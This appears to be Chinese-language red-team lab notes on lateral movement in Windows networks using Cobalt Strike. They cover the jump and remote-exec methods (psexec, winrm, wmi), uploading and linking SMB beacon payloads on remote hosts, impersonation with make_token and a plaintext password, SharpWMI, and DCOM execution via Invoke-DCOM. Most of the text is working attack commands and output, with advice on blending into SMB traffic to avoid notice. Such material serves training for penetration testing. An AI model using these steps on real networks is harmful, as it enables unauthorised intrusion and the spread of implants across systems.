 # Lateral Movement

在Cobalt Strike里，提供了三种方法进行横向移动

## ```jump```命令

用法：```jump [method] [target] [listener]```

```
beacon> jump

Beacon Remote Exploits
======================

    Exploit                   Arch  Description
    -------                   ----  -----------
    psexec                    x86   Use a service to run a Service EXE artifact
    psexec64                  x64   Use a service to run a Service EXE artifact
    psexec_psh                x86   Use a service to run a PowerShell one-liner
    winrm                     x86   Run a PowerShell script via WinRM
    winrm64                   x64   Run a PowerShell script via WinRM
```

## ```remote-exec```命令

用法：```remote-exec [method] [target] [command]```

```
beacon> remote-exec

Beacon Remote Execute Methods
=============================

    Methods                         Description
    -------                         -----------
    psexec                          Remote execute via Service Control Manager
    winrm                           Remote execute via WinRM (PowerShell)
    wmi                             Remote execute via WMI
```


## ```powershell```和```execute-assembly```等Cobalt Strike内置的命令


通过列举C盘目录验证是否横向成功
```
ls \\srv-1\c$
```


# PowerShell Remoting

查询靶机架构
```
beacon> remote-exec winrm srv-1 (Get-WmiObject Win32_OperatingSystem).OSArchitecture
64-bit
```

```winrm```32位横向使用


```winrm64```64位横向使用



推荐使用 SMB 协议横向。SMB 协议在 Windows 环境中广泛使用，因此横向的时候可以和smb本身的流量融合在一起。
```
beacon> jump winrm64 srv-1 smb
[+] established link to child beacon: 10.10.17.25
```


WinRM返回的是一个高完整性的beacon，可以和远程计算机建立交互式的shell


# PsExec

psexec和psexec64是唯一执行```jump```命令后可以自动执行进程迁移的方法（默认为rundll32.exe），这样做是为了自动从磁盘中删除上传的服务二进制文件。

```
beacon> jump psexec64 srv-1 smb
Started service dd80980 on srv-1
[+] established link to child beacon: 10.10.17.25
```


# Windows Management Instrumentation (WMI)

WMI 不是jump命令的一部分，但它是remote-exec命令的一部分

```
beacon> cd \\srv-1\ADMIN$
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe
Started process 536 on srv-1
```

上面命令执行完以后，该进程已经在srv-1运行，需要用```link```命令连接

```
beacon> link srv-1
[+] established link to child beacon: 10.10.17.25
```

# The Curious Case of CoInitializeSecurity

CoInitializeSecurity的特殊案例

Beacon对WMI的内部实现使用一个[Beacon Object File](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm)，使用[beacon_inline_execute](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#beacon_inline_execute) Aggressor函数执行。当BOF被执行时，[CoInitializeSecurity](https://docs.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-coinitializesecurity) COM对象可以被调用，它被用来为当前进程设置安全上下文。根据微软的文档，每个进程只能调用一次。

不幸的后果是，如果你让CoInitializeSecurity在 "用户A "的上下文中被调用，那么未来的BOF可能无法在Beacon进程的生命周期中继承一个不同的安全上下文（"用户B"）。

这方面的一个例子是这样的。

```
beacon> make_token DEV\jking Purpl3Drag0n
[+] Impersonated DEV\bfarmer

beacon> remote-exec wmi srv-2 calc
CoInitializeSecurity already called. Thread token (if there is one) may not get used
[-] Could not connect to srv-2: 5
```


我们知道```jking```是SRV-2上的本地管理员，但是由于```CoInitializeSecurity```已经被调用（可能是在bfarmer的上下文中），WMI执行失败，显示拒绝访问。

作为一种变通方法，你的WMI执行需要来自不同的进程。这可以通过 ```spawn``` 和 ```spawnas``` 等命令来实现，甚至可以使用```execute-assembly```执行```SharpWMI```工具

```
beacon> remote-exec wmi srv-2 calc
CoInitializeSecurity already called. Thread token (if there is one) may not get used
[-] Could not connect to srv-2: 5

beacon> execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Debug\SharpWMI.exe action=exec computername=srv-2 command="C:\Windows\System32\calc.exe"

[*] Host                           : srv-2
[*] Command                        : C:\Windows\System32\calc.exe
[*] Creation of process returned   : 0
[*] Process ID                     : 1312
```


# DCOM

Beacon 没有通过Distributed Component Object Model (DCOM) 进行交互的内置功能，因此必须使用诸如[Invoke-DCOM](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1)之类的外部工具。我们将在后面的模块中看到如何将其集成到jump命令中

```
beacon> powershell-import C:\Tools\Invoke-DCOM.ps1
beacon> powershell Invoke-DCOM -ComputerName srv-1 -Method MMC20.Application -Command C:\Windows\beacon-smb.exe
Completed

beacon> link srv-1
[+] established link to child beacon: 10.10.17.25
```